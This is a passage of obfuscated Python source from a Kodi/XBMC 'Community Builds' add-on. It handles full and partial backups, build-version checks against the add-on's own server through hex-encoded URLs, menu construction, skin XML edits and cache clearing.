      IiIIi1 = '01/01/1980'
      iII11I1Ii1 = time . strftime ( '%d/%m/%Y' , time . gmtime ( os . path . getmtime ( i1i1I ) ) )
      if iII11I1Ii1 > IiIIi1 :
       oOoO00 . write ( i1i1I , i1i1I [ iI1IIIii : ] )
     except : print "Unable to backup file: " + file
 oOoO00 . close ( )
 o0OOO . close ( )
 if 92 - 92: IIiII / IIiII . i1i1i11IIi
 if 17 - 17: oO00OO0oo0 - II11iII * O00oo0OO0oOOO
def IIi1IIIIi ( sourcefile , destfile ) :
 oOoO00 = zipfile . ZipFile ( destfile , 'w' , zipfile . ZIP_DEFLATED )
 iI1IIIii = len ( sourcefile )
 I1i11ii11 = [ ]
 OO00O0oOO = [ ]
 o0OOO . create ( "[COLOR=blue][B]T[/COLOR][COLOR=dodgerblue]R[/COLOR] [COLOR=white]Community Builds[/COLOR][/B]" , "Archiving..." , '' , 'Please Wait' )
 for Ii1iI111 , O0oooo00o0Oo , I1iii in os . walk ( sourcefile ) :
  for file in I1iii :
   OO00O0oOO . append ( file )
 oO0o0O0Ooo0o = len ( OO00O0oOO )
 for Ii1iI111 , O0oooo00o0Oo , I1iii in os . walk ( sourcefile ) :
  for file in I1iii :
   I1i11ii11 . append ( file )
   oO0oOOO0Ooo = len ( I1i11ii11 ) / float ( oO0o0O0Ooo0o ) * 100
   o0OOO . update ( int ( oO0oOOO0Ooo ) , "Backing Up" , '[COLOR yellow]%s[/COLOR]' % file , 'Please Wait' )
   i1i1I = os . path . join ( Ii1iI111 , file )
   if not 'temp' in O0oooo00o0Oo :
    if not oo000 in O0oooo00o0Oo :
     import time
     IiIIi1 = '01/01/1980'
     iII11I1Ii1 = time . strftime ( '%d/%m/%Y' , time . gmtime ( os . path . getmtime ( i1i1I ) ) )
     if iII11I1Ii1 > IiIIi1 :
      oOoO00 . write ( i1i1I , i1i1I [ iI1IIIii : ] )
 oOoO00 . close ( )
 o0OOO . close ( )
 if 70 - 70: OO0O / II11iII - i1iiI11I - iIIi1iIIi
 if 11 - 11: i1iiI11I . iiIi . II11iII / iiiIi1i1I - IIiII
def ii1ii11 ( ) :
 o0oO ( '' , '[COLOR=lime]Full Backup[/COLOR]' , 'url' , 'community_backup' , 'Backup.png' , '' , '' , 'Back Up Your Full System' )
 o0oO ( '' , 'Backup Just Your Addons' , 'addons' , 'restore_zip' , 'Backup.png' , '' , '' , 'Back Up Your Addons' )
 o0oO ( '' , 'Backup Just Your Addon UserData' , 'addon_data' , 'restore_zip' , 'Backup.png' , '' , '' , 'Back Up Your Addon Userdata' )
 o0oO ( '' , 'Backup Guisettings.xml' , i1 , 'restore_backup' , 'Backup.png' , '' , '' , 'Back Up Your guisettings.xml' )
 if os . path . exists ( I11 ) :
  o0oO ( '' , 'Backup Favourites.xml' , I11 , 'restore_backup' , 'Backup.png' , '' , '' , 'Back Up Your favourites.xml' )
 if os . path . exists ( Oo0o0000o0o0 ) :
  o0oO ( '' , 'Backup Source.xml' , Oo0o0000o0o0 , 'restore_backup' , 'Backup.png' , '' , '' , 'Back Up Your sources.xml' )
 if os . path . exists ( oOo0oooo00o ) :
  o0oO ( '' , 'Backup Advancedsettings.xml' , oOo0oooo00o , 'restore_backup' , 'Backup.png' , '' , '' , 'Back Up Your advancedsettings.xml' )
 if os . path . exists ( oO ) :
  o0oO ( '' , 'Backup Advancedsettings.xml' , oO , 'restore_backup' , 'Backup.png' , '' , '' , 'Back Up Your keyboard.xml' )
 if os . path . exists ( oo0o0O00 ) :
  o0oO ( '' , 'Backup RssFeeds.xml' , oo0o0O00 , 'restore_backup' , 'Backup.png' , '' , '' , 'Back Up Your RssFeeds.xml' )
  if 84 - 84: III1i1i . IIiII - II11iII . OOO00O / II11iII
  if 47 - 47: iiIi
def ii1i1i1IiII ( ) :
 o0oO ( 'folder' , 'Backup My Content' , 'none' , 'backup_option' , 'Backup.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Restore My Content' , 'none' , 'restore_option' , 'Restore.png' , '' , '' , '' )
 if 63 - 63: iIIi1iIIi . I11iii1Ii / II11iII * O0OoO + o0OOOoO0 % iIi1iIiii111
 if 12 - 12: OO . I11iii1Ii . iIIi1iIIi - iiIi % O000OO0
def i11i1iIiii ( localbuildcheck , localversioncheck , id , welcometext ) :
 global iIi1ii1I1
 OOO00OO0oOo = ii . getSetting ( 'addonportal' )
 I1I1iI = ii . getSetting ( 'maintenance' )
 I1iIi1iiIIiI = ii . getSetting ( 'hardwareportal' )
 oOoOOoOOooOO = ii . getSetting ( 'maintenance' )
 I11I = ii . getSetting ( 'latestnews' )
 iIIII1i = ii . getSetting ( 'tutorialportal' )
 if ( o0OoOoOO00 . replace ( '%20' , ' ' ) in welcometext ) and ( 'elc' in welcometext ) :
  iIi1ii1I1 = '1889903'
  o0oO ( '' , welcometext , 'show' , 'user_info' , 'TOTALXBMC.png' , '' , '' , '' )
  if id != 'None' :
   if id != 'Local' :
    o00oO0 = i11I1II ( localbuildcheck , localversioncheck , id )
    if o00oO0 == True :
     o0oO ( '' , '[COLOR=dodgerblue]' + localbuildcheck + ':[/COLOR] [COLOR=lime]NEW VERSION AVAILABLE[/COLOR]' , id , 'showinfo' , 'TOTALXBMC.png' , '' , '' , '' )
    else :
     if '(Partially installed)' in localbuildcheck :
      o0oO ( '' , '[COLOR=lime]Current Build Installed: [/COLOR][COLOR=dodgerblue]' + localbuildcheck + '[/COLOR]' , '' , 'showinfo2' , 'TOTALXBMC.png' , '' , '' , '' )
     else :
      o0oO ( '' , '[COLOR=lime]Current Build Installed: [/COLOR][COLOR=dodgerblue]' + localbuildcheck + '[/COLOR]' , id , 'showinfo' , 'TOTALXBMC.png' , '' , '' , '' )
   else :
    if localbuildcheck == 'Incomplete' :
     o0oO ( '' , '[COLOR=lime]Your last restore is not yet completed[/COLOR]' , 'url' , OO0OOO0oOOo00O ( ) , 'TOTALXBMC.png' , '' , '' , '' )
    else :
     o0oO ( '' , '[COLOR=lime]Current Build Installed: [/COLOR][COLOR=dodgerblue]Local Build (' + localbuildcheck + ')[/COLOR]' , 'TOTALXBMC.png' , '' , '' , '' , '' , '' )
  o0oO ( '' , '[COLOR=gold]----------------------------------------------[/COLOR]' , 'None' , '' , 'TOTALXBMC.png' , '' , '' , '' )
 if o0OoOoOO00 != '' and I11i != '' and iIi1ii1I1 != '1889903' and I1ii11iIi11i == 'true' :
  o0oO ( '' , '[COLOR=lime]Unable to login, please check your details[/COLOR]' , 'None' , 'addon_settings' , 'TOTALXBMC.png' , '' , '' , '' )
 if I1ii11iIi11i == 'true' and iIi1ii1I1 != '1889903' :
  o0oO ( '' , welcometext , 'None' , 'register' , 'TOTALXBMC.png' , '' , '' , '' )
 o0oO ( '' , '[COLOR=yellow]Settings[/COLOR]' , 'settings' , 'addon_settings' , 'SETTINGS.png' , '' , '' , '' )
 if OOO00OO0oOo == 'true' :
  o0oO ( 'folder' , 'Add-on Portal' , iIi1ii1I1 , 'addonmenu' , 'Search_Addons.png' , '' , '' , '' )
 if I1I1iI == 'true' :
  o0oO ( 'folder' , 'Community Builds' , welcometext , 'community' , 'Community_Builds.png' , '' , '' , '' )
 if I1iIi1iiIIiI == 'true' :
  o0oO ( 'folder' , 'Hardware Reviews' , 'none' , 'hardware_root_menu' , 'hardware.png' , '' , '' , '' )
 if I11I == 'true' :
  o0oO ( 'folder' , 'Latest News' , 'none' , 'news_root_menu' , 'LatestNews.png' , '' , '' , '' )
 if iIIII1i == 'true' :
  o0oO ( 'folder' , 'Tutorials' , '' , 'tutorial_root_menu' , 'TotalXBMC_Guides.png' , '' , '' , '' )
 if oOoOOoOOooOO == 'true' :
  o0oO ( 'folder' , 'Maintenance' , 'none' , 'tools' , 'Additional_Tools.png' , '' , '' , '' )
  if 51 - 51: i1i1i11IIi / i1iiI11I % o0OOOoO0 + O00oo0OO0oOOO * OOO00O + OO
  if 77 - 77: OOO00O * OooOooo
def i1i1111IiI ( welcometext ) :
 i1I1I1iiII ( 'disclaimer.xml' )
 O00o00O = xbmc . getInfoLabel ( "System.BuildVersion" )
 ii1iii11i1 = float ( O00o00O [ : 2 ] )
 iiii111II = int ( ii1iii11i1 )
 if o0O == 'true' :
  if iI11I1II1I1I == 'true' :
   I11Oo00oO0O ( 'yes' )
  if iI11I1II1I1I == 'false' :
   I11Oo00oO0O ( 'no' )
 if O0 == 'true' :
  o0oO ( 'folder' , '[COLOR=lime]Show My Private List[/COLOR]' , '&visibility=private' , 'grab_builds' , 'Private_builds.png' , '' , '' , '' )
 if ( ( o0OoOoOO00 . replace ( '%20' , ' ' ) in welcometext ) and ( 'elc' in welcometext ) ) or ( o0O == 'true' ) :
  if ( iiii111II < 14 ) or ( O0O == 'true' ) :
   o0oO ( 'folder' , '[COLOR=orange]Show All Gotham Compatible Builds[/COLOR]' , '&xbmc=gotham&visibility=public' , 'grab_builds' , 'TRCOMMUNITYGOTHAMBUILDS.png' , '' , '' , '' )
  if ( iiii111II == 14 ) or ( O0O == 'true' ) :
   o0oO ( 'folder' , '[COLOR=orange]Show All Helix Compatible Builds[/COLOR]' , '&xbmc=helix&visibility=public' , 'grab_builds' , 'TRCOMMUNITYHELIXBUILDS.png' , '' , '' , '' )
  if ( iiii111II == 15 ) or ( O0O == 'true' ) :
   o0oO ( 'folder' , '[COLOR=orange]Show All Isengard Compatible Builds[/COLOR]' , '&xbmc=isengard&visibility=public' , 'grab_builds' , 'TRCOMMUNITYHELIXBUILDS.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Restore a locally stored Community Build' , 'url' , 'restore_local_CB' , 'Restore.png' , '' , '' , 'Back Up Your Full System' )
 o0oO ( 'folder' , 'Create My Own Community Build' , 'url' , 'community_backup' , 'Backup.png' , '' , '' , 'Back Up Your Full System' )
 if 96 - 96: i1i1i11IIi / II11iII . iIi1iIiii111 - iIIi1iIIi * IIiII * o0OOOoO0
 if 76 - 76: iIi1iIiii111 - II11iII * OO0O / iiIi
def IIIiIi ( skin ) :
 Iii = '<onleft>%s</onleft>'
 IIIII1iii = '<onright>%s</onright>'
 IIiiii = '<onup>%s</onup>'
 iI111i1I1II = '<ondown>%s</ondown>'
 O00OO = '<control type="button" id="%s">'
 II1Ii1iI1i1 = [ ( '65' , '140' ) , ( '66' , '164' ) , ( '67' , '162' ) , ( '68' , '142' ) , ( '69' , '122' ) , ( '70' , '143' ) , ( '71' , '144' ) , ( '72' , '145' ) , ( '73' , '127' ) , ( '74' , '146' ) , ( '75' , '147' ) , ( '76' , '148' ) , ( '77' , '166' ) , ( '78' , '165' ) , ( '79' , '128' ) , ( '80' , '129' ) , ( '81' , '120' ) , ( '82' , '123' ) , ( '83' , '141' ) , ( '84' , '124' ) , ( '85' , '126' ) , ( '86' , '163' ) , ( '87' , '121' ) , ( '88' , '161' ) , ( '89' , '125' ) , ( '90' , '160' ) ]
 for o0OoO000O , OOo in II1Ii1iI1i1 :
  iIIiiIIIi1I = open ( skin ) . read ( )
  OO0o0o0oo0O = iIIiiIIIi1I . replace ( O00OO % o0OoO000O , O00OO % OOo ) . replace ( Iii % o0OoO000O , Iii % OOo ) . replace ( IIIII1iii % o0OoO000O , IIIII1iii % OOo ) . replace ( IIiiii % o0OoO000O , IIiiii % OOo ) . replace ( iI111i1I1II % o0OoO000O , iI111i1I1II % OOo )
  Ii = open ( skin , mode = 'w' )
  Ii . write ( OO0o0o0oo0O )
  Ii . close ( )
  if 40 - 40: O00oo0OO0oOOO + O000OO0 . O00oo0OO0oOOO % OOO00O
def I11I1IIiiII1 ( u , skin ) :
 Iii = '<onleft>%s</onleft>'
 IIIII1iii = '<onright>%s</onright>'
 IIiiii = '<onup>%s</onup>'
 iI111i1I1II = '<ondown>%s</ondown>'
 O00OO = '<control type="button" id="%s">'
 if u < 49 :
  IIIIIii1ii11 = u + 61
 else :
  IIIIIii1ii11 = u + 51
 iIIiiIIIi1I = open ( skin ) . read ( )
 OO0o0o0oo0O = iIIiiIIIi1I . replace ( Iii % u , Iii % IIIIIii1ii11 ) . replace ( IIIII1iii % u , IIIII1iii % IIIIIii1ii11 ) . replace ( IIiiii % u , IIiiii % IIIIIii1ii11 ) . replace ( iI111i1I1II % u , iI111i1I1II % IIIIIii1ii11 ) . replace ( O00OO % u , O00OO % IIIIIii1ii11 )
 Ii = open ( skin , mode = 'w' )
 Ii . write ( OO0o0o0oo0O )
 Ii . close ( )
 if 86 - 86: OooOooo * II11iII - III1i1i . OooOooo % i1iiI11I / OO0O
 if 11 - 11: OoOo * o0OOOoO0 + i1i1i11IIi / i1i1i11IIi
def iiii1I1 ( ) :
 IIIiIiI11iIi = xbmc . translatePath ( os . path . join ( zip , 'testCBFolder' ) )
 if not os . path . exists ( zip ) :
  I1IiI . ok ( '[COLOR=blue][B]T[/COLOR][COLOR=dodgerblue]R[/COLOR] [COLOR=white]Community Builds[/COLOR][/B]' , 'The download location you have stored does not exist .\nPlease update the addon settings and try again.' , '' , '' )
  ii . openSettings ( sys . argv [ 0 ] )
  if 89 - 89: III1i1i
  if 2 - 2: i1i1i11IIi . i1i1i11IIi + i1i1i11IIi * O00oo0OO0oOOO
def i11I1II ( localbuildcheck , localversioncheck , id ) :
 oOo00oOOOOO = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f436f6d6d756e6974795f4275696c64732f6275696c647570646174652e7068703f69643d2573'
 IIII = binascii . unhexlify ( oOo00oOOOOO ) % ( id )
 iiIiI = o00oooO0Oo ( IIII ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 if id != 'None' :
  OoOOo0O00 = re . compile ( 'version="(.+?)"' ) . findall ( iiIiI )
  iIiI = OoOOo0O00 [ 0 ] if ( len ( OoOOo0O00 ) > 0 ) else ''
 if localversioncheck < iIiI :
  return True
 else :
  return False
  if 5 - 5: O000OO0 * OooOooo
  if 46 - 46: OOO00O
def I11iIiII ( url ) :
 time . sleep ( 120 )
 if os . path . exists ( OooO0 ) :
  OO0OO0OO = xbmcgui . Dialog ( ) . yesno ( 'Run step 2 of install' , 'You still haven\'t completed step 2 of the' , 'install. Would you like to complete it now?' , '' , nolabel = 'No, not yet' , yeslabel = 'Yes, complete setup' )
  if OO0OO0OO == 0 :
   I11iIiII ( url )
  elif OO0OO0OO == 1 :
   try : xbmc . executebuiltin ( "PlayerControl(Stop)" )
   except : pass
   xbmc . executebuiltin ( "ActivateWindow(appearancesettings)" )
   OoooO0o ( url , IIIii1iiIi )
   if 63 - 63: i1i1i11IIi
   if 6 - 6: OOO00O / i1i1i11IIi
def OO0OOO0oOOo00O ( ) :
 oOooO00o0O = open ( iI111I11I1I1 , mode = 'r' )
 OOo0 = file . read ( oOooO00o0O )
 file . close ( oOooO00o0O )
 iiIii1IIi = re . compile ( 'name="(.+?)"' ) . findall ( OOo0 )
 ii1IiIiI1 = iiIii1IIi [ 0 ] if ( len ( iiIii1IIi ) > 0 ) else ''
 if ii1IiIiI1 == "Incomplete" :
  OO0OO0OO = xbmcgui . Dialog ( ) . yesno ( "Finish Restore Process" , 'If you\'re certain the correct skin has now been set click OK' , 'to finish the install process, once complete XBMC/Kodi will' , ' then close. Do you want to finish the install process?' , yeslabel = 'Yes' , nolabel = 'No' )
  if OO0OO0OO == 1 :
   OOOoOo00O ( )
  elif OO0OO0OO == 0 :
   return
   if 59 - 59: OO0O % i1iiI11I . iiiIi1i1I + II11iII * O0OoO
def i1IiiI1iIi ( ) :
 IIIiIiI11iIi = xbmc . translatePath ( os . path . join ( zip , 'testCBFolder' ) )
 try :
  os . makedirs ( IIIiIiI11iIi )
  os . removedirs ( IIIiIiI11iIi )
  I1IiI . ok ( '[COLOR=lime]SUCCESS[/COLOR]' , 'Great news, the path you chose is writeable.' , 'Some of these builds are rather big, we recommend' , 'a minimum of 1GB storage space.' )
 except :
  I1IiI . ok ( '[COLOR=red]CANNOT WRITE TO PATH[/COLOR]' , 'Kodi cannot write to the path you\'ve chosen. Please click OK' , 'in the settings menu to save the path then try again.' , 'Some devices give false results, we recommend using a USB stick as the backup path.' )
  if 66 - 66: I11iii1Ii * O000OO0
  if 28 - 28: I11iii1Ii % OooOooo % i1i1i11IIi + OoOo / OoOo
def OO0O0ooOOO00 ( data ) :
 data = data . replace ( '</p><p>' , '[CR][CR]' ) . replace ( '&ndash;' , '-' ) . replace ( '&mdash;' , '-' ) . replace ( "\n" , " " ) . replace ( "\r" , " " ) . replace ( "&rsquo;" , "'" ) . replace ( "&rdquo;" , '"' ) . replace ( "</a>" , " " ) . replace ( "&hellip;" , '...' ) . replace ( "&lsquo;" , "'" ) . replace ( "&ldquo;" , '"' )
 data = " " . join ( data . split ( ) )
 IiIiiiiI1 = re . compile ( r'< script[^<>]*?>.*?< / script >' )
 data = IiIiiiiI1 . sub ( '' , data )
 IiIiiiiI1 = re . compile ( r'< style[^<>]*?>.*?< / style >' )
 data = IiIiiiiI1 . sub ( '' , data )
 IiIiiiiI1 = re . compile ( r'' )
 data = IiIiiiiI1 . sub ( '' , data )
 IiIiiiiI1 = re . compile ( r'<[^<]*?>' )
 data = IiIiiiiI1 . sub ( '' , data )
 data = data . replace ( '&nbsp;' , ' ' )
 return data
 if 62 - 62: i1i1i11IIi % iIIi1iIIi * I11iii1Ii - iiiIi1i1I
 if 66 - 66: oO00OO0oo0 / O00oo0OO0oOOO - iiIi / iiiIi1i1I . oO00OO0oo0
def IIIII1iii11 ( ) :
 OO0OO0OO = xbmcgui . Dialog ( ) . yesno ( 'Clear All Known Cache?' , 'This will clear all known cache files and can help' , 'if you\'re encountering kick-outs during playback.' , 'as well as other random issues. There is no harm in using this.' , nolabel = 'Cancel' , yeslabel = 'Delete' )
 if OO0OO0OO == 1 :
  IIi1I ( )
  iiiO00O00O000OOO ( )
  if 3 - 3: III1i1i
  if 64 - 64: iiiIi1i1I % OOO00O / oO00OO0oo0 - iiiIi1i1I % OO0O . iIIi1iIIi
def II1i111 ( url ) :
 o0oO ( 'folder' , 'African' , str ( url ) + '&genre=african' , 'grab_builds' , 'african.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Arabic' , str ( url ) + '&genre=arabic' , 'grab_builds' , 'arabic.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Asian' , str ( url ) + '&genre=asian' , 'grab_builds' , 'asian.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Australian' , str ( url ) + '&genre=australian' , 'grab_builds' , 'australian.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Austrian' , str ( url ) + '&genre=austrian' , 'grab_builds' , 'austrian.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Belgian' , str ( url ) + '&genre=belgian' , 'grab_builds' , 'belgian.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Brazilian' , str ( url ) + '&genre=brazilian' , 'grab_builds' , 'brazilian.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Canadian' , str ( url ) + '&genre=canadian' , 'grab_builds' , 'canadian.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Columbian' , str ( url ) + '&genre=columbian' , 'grab_builds' , 'columbian.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Czech' , str ( url ) + '&genre=czech' , 'grab_builds' , 'czech.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Danish' , str ( url ) + '&genre=danish' , 'grab_builds' , 'danish.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Dominican' , str ( url ) + '&genre=dominican' , 'grab_builds' , 'dominican.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Dutch' , str ( url ) + '&genre=dutch' , 'grab_builds' , 'dutch.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Egyptian' , str ( url ) + '&genre=egyptian' , 'grab_builds' , 'egyptian.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Filipino' , str ( url ) + '&genre=filipino' , 'grab_builds' , 'filipino.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Finnish' , str ( url ) + '&genre=finnish' , 'grab_builds' , 'finnish.png' , '' , '' , '' )
 o0oO ( 'folder' , 'French' , str ( url ) + '&genre=french' , 'grab_builds' , 'french.png' , '' , '' , '' )
 o0oO ( 'folder' , 'German' , str ( url ) + '&genre=german' , 'grab_builds' , 'german.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Greek' , str ( url ) + '&genre=greek' , 'grab_builds' , 'greek.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Hebrew' , str ( url ) + '&genre=hebrew' , 'grab_builds' , 'hebrew.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Hungarian' , str ( url ) + '&genre=hungarian' , 'grab_builds' , 'hungarian.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Icelandic' , str ( url ) + '&genre=icelandic' , 'grab_builds' , 'icelandic.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Indian' , str ( url ) + '&genre=indian' , 'grab_builds' , 'indian.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Irish' , str ( url ) + '&genre=irish' , 'grab_builds' , 'irish.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Italian' , str ( url ) + '&genre=italian' , 'grab_builds' , 'italian.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Japanese' , str ( url ) + '&genre=japanese' , 'grab_builds' , 'japanese.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Korean' , str ( url ) + '&genre=korean' , 'grab_builds' , 'korean.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Lebanese' , str ( url ) + '&genre=lebanese' , 'grab_builds' , 'lebanese.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Mongolian' , str ( url ) + '&genre=mongolian' , 'grab_builds' , 'mongolian.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Nepali' , str ( url ) + '&genre=nepali' , 'grab_builds' , 'nepali.png' , '' , '' , '' )
 o0oO ( 'folder' , 'New Zealand' , str ( url ) + '&genre=newzealand' , 'grab_builds' , 'newzealand.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Norwegian' , str ( url ) + '&genre=norwegian' , 'grab_builds' , 'norwegian.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Pakistani' , str ( url ) + '&genre=pakistani' , 'grab_builds' , 'pakistani.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Polish' , str ( url ) + '&genre=polish' , 'grab_builds' , 'polish.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Portuguese' , str ( url ) + '&genre=portuguese' , 'grab_builds' , 'portuguese.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Romanian' , str ( url ) + '&genre=romanian' , 'grab_builds' , 'romanian.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Russian' , str ( url ) + '&genre=russian' , 'grab_builds' , 'russian.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Singapore' , str ( url ) + '&genre=singapore' , 'grab_builds' , 'singapore.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Spanish' , str ( url ) + '&genre=spanish' , 'grab_builds' , 'spanish.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Swedish' , str ( url ) + '&genre=swedish' , 'grab_builds' , 'swedish.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Swiss' , str ( url ) + '&genre=swiss' , 'grab_builds' , 'swiss.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Syrian' , str ( url ) + '&genre=syrian' , 'grab_builds' , 'syrian.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Tamil' , str ( url ) + '&genre=tamil' , 'grab_builds' , 'tamil.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Thai' , str ( url ) + '&genre=thai' , 'grab_builds' , 'thai.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Turkish' , str ( url ) + '&genre=turkish' , 'grab_builds' , 'turkish.png' , '' , '' , '' )
 o0oO ( 'folder' , 'UK' , str ( url ) + '&genre=uk' , 'grab_builds' , 'uk.png' , '' , '' , '' )
 o0oO ( 'folder' , 'USA' , str ( url ) + '&genre=usa' , 'grab_builds' , 'usa.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Vietnamese' , str ( url ) + '&genre=vietnamese' , 'grab_builds' , 'vietnamese.png' , '' , '' , '' )
 if 50 - 50: O0OoO % iiiIi1i1I
 if 21 - 21: iiIi - i1iiI11I
def OO0OoOOO0 ( ) :
 O00ooOo = 1
 iiii1I1 ( )
 oOO0o00O = xbmc . translatePath ( os . path . join ( i1iiIIiiI111 , 'Community Builds' , 'My Builds' , '' ) )
 oOoO = xbmc . translatePath ( os . path . join ( i1iiIIiiI111 , 'Community Builds' , 'My Builds' , 'my_full_backup.zip' ) )
 IIIIiI1iiiIiii = xbmc . translatePath ( os . path . join ( i1iiIIiiI111 , 'Community Builds' , 'My Builds' , 'my_full_backup_GUI_Settings.zip' ) )
 if not os . path . exists ( oOO0o00O ) :
  os . makedirs ( oOO0o00O )
 ii1i1i = II11iIII1i1I ( heading = "Enter a name for this backup" )
 if ( not ii1i1i ) : return False , 0
 oOO0oo = urllib . quote_plus ( ii1i1i )
 IiIIi1I1I11Ii = xbmc . translatePath ( os . path . join ( oOO0o00O , oOO0oo + '.zip' ) )
 o0OO = [ oo000 ]
 OoiiIiI = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' ]
 o0Ooo0O00 = [ oo000 , 'cache' , 'system' , 'Thumbnails' , "peripheral_data" , 'library' , 'keymaps' ]
 ii1o0oooO = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , "Textures13.db" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , 'advancedsettings.xml' ]
 ooOo = "Creating full backup of existing build"
 o0oO0OoO0 = "Creating Community Build"
 oOOOOOoOO = "Archiving..."
 oooo00 = ""
 i1oO = "Please Wait"
 if iIiiiI1IiI1I1 == 'true' :
  i1i1IIii1i1 ( iIiiiI , oOoO , ooOo , oOOOOOoOO , oooo00 , i1oO , o0OO , OoiiIiI )
 OO0OO0OO = xbmcgui . Dialog ( ) . yesno ( "Do you want to include your addon_data folder?" , 'This contains ALL addon settings including passwords.' , 'If you\'re intending on sharing this with others we stongly' , 'recommend against this unless all data has been manually removed.' , yeslabel = 'Yes' , nolabel = 'No' )
 if OO0OO0OO == 0 :
  iIIi1IIi ( )
 elif OO0OO0OO == 1 :
  pass
 i111i11I1ii ( iIiiiI )
 OOooo ( )
 i1i1IIii1i1 ( iIiiiI , IiIIi1I1I11Ii , o0oO0OoO0 , oOOOOOoOO , oooo00 , i1oO , o0Ooo0O00 , ii1o0oooO )
 time . sleep ( 1 )
 oo0 = xbmc . translatePath ( os . path . join ( oOO0o00O , oOO0oo + '_guisettings.zip' ) )
 oOOII1i11i1iIi11 = zipfile . ZipFile ( oo0 , mode = 'w' )
 try :
  oOOII1i11i1iIi11 . write ( i1 , 'guisettings.xml' , zipfile . ZIP_DEFLATED )
 except : O00ooOo = 0
 try :
  oOOII1i11i1iIi11 . write ( xbmc . translatePath ( os . path . join ( iIiiiI , 'userdata' , 'profiles.xml' ) ) , 'profiles.xml' , zipfile . ZIP_DEFLATED )
 except : pass
 oOOII1i11i1iIi11 . close ( )
 if iIiiiI1IiI1I1 == 'true' :
  oo0O0oO0O0O = zipfile . ZipFile ( IIIIiI1iiiIiii , mode = 'w' )
  try :
   oo0O0oO0O0O . write ( i1 , 'guisettings.xml' , zipfile . ZIP_DEFLATED )
  except : O00ooOo = 0
  if 69 - 69: o0OOOoO0 / oO00OO0oo0
  try :
   oo0O0oO0O0O . write ( xbmc . translatePath ( os . path . join ( iIiiiI , 'userdata' , 'profiles.xml' ) ) , 'profiles.xml' , zipfile . ZIP_DEFLATED )
  except : pass
  oo0O0oO0O0O . close ( )
 if O00ooOo == 0 :
  I1IiI . ok ( "FAILED!" , 'The guisettings.xml file could not be found on your' , 'system, please reboot and try again.' , '' )
 else :
  I1IiI . ok ( "SUCCESS!" , 'You Are Now Backed Up. If you\'d like to share this build with' , 'the community please post details on the forum at' , '[COLOR=lime][B]www.totalxbmc.tv[/COLOR][/B]' )
  I1IiI . ok ( "Build Locations" , 'Full Backup (only used to restore on this device): [COLOR=yellow]' + oOoO , '[/COLOR]Universal Backup (can be used on any device): [COLOR=yellow]' + IiIIi1I1I11Ii + '[/COLOR]' )
  if 94 - 94: o0OOOoO0 / O0OoO / iiiIi1i1I * i1iiI11I
  if 64 - 64: II11iII / i1iiI11I
def o0IiiiI1 ( url , video ) :
 OOOo0 = 0
 OOo0Oo0OOo0 = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f436f6d6d756e6974795f4275696c64732f636f6d6d756e6974795f6275696c64735f7072656d69756d2e7068703f69643d2573'
 IIII = binascii . unhexlify ( OOo0Oo0OOo0 ) % ( url )
 iiIiI = o00oooO0Oo ( IIII ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 i1i11I = re . compile ( 'path="(.+?)"' ) . findall ( iiIiI )
 iiIiIi1 = re . compile ( 'myart="(.+?)"' ) . findall ( iiIiI )
 oOOOOOOOoO = re . compile ( 'artpack="(.+?)"' ) . findall ( iiIiI )
 IiIi11iI = re . compile ( 'videopreview="(.+?)"' ) . findall ( iiIiI )
 I1 = re . compile ( 'videoguide1="(.+?)"' ) . findall ( iiIiI )
 IIiI = re . compile ( 'videoguide2="(.+?)"' ) . findall ( iiIiI )
 O0oOOo0o = re . compile ( 'videoguide3="(.+?)"' ) . findall ( iiIiI )
 I1III11iiii11i1 = re . compile ( 'videoguide4="(.+?)"' ) . findall ( iiIiI )
 ooOo0OoO = re . compile ( 'videoguide5="(.+?)"' ) . findall ( iiIiI )
